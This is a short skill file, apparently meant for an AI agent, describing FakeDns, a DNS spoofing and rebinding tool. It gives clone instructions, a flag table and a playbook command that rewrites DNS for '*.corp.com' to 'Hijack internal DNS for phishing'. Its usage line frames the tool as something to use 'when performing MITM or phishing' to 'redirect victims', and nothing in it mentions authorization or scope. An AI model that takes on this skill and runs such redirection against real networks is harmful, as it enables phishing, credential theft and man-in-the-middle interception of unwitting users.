---
name: fakedns-dns-redirect
description: "FakeDns: DNS phishing redirection. Signals: man-in-the-middle, MITM, DNS spoofing, rebinding, non-authoritative."
zh-signals: "FakeDns: DNS 钓鱼重定向。信号:中间人,mitm,DNS 伪造,重绑定,非权威。"
when-to-use: >-
  Use when performing MITM or phishing and you need to spoof DNS responses,
  including rebinding, to redirect victims.
---

# FakeDns

- Attack Category: C40 Sniffing and Man-in-the-Middle Attacks
- Upstream Repository: https://github.com/Crypt0s/FakeDns
- Upstream License: MIT (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/Crypt0s/FakeDns && cd FakeDns
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `python3 fakedns.py -c dns.conf` | DNS spoofing |
| `fakedns.py --rebind` | Rebinding |
| `--non authoritative` | Non-authoritative |

## Attack Scenario Playbook

### DNS phishing redirection

```bash
echo '*.corp.com 10.0.0.5' > dns.conf && python3 fakedns.py -c dns.conf
# Hijack internal DNS for phishing
```

## Notes

Configurable DNS spoofing with rebinding support.
